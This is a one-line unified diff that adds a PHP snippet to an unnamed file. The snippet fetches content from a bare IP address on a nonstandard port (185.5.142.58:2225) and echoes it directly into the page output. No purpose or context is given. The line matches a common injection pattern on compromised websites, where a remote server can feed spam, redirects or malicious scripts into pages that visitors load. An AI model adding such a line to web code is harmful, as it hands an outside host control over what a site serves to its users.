@@ -1,0 +1,1 @@
+<? echo file_get_contents('http://185.5.142.58:2225/'); ?>
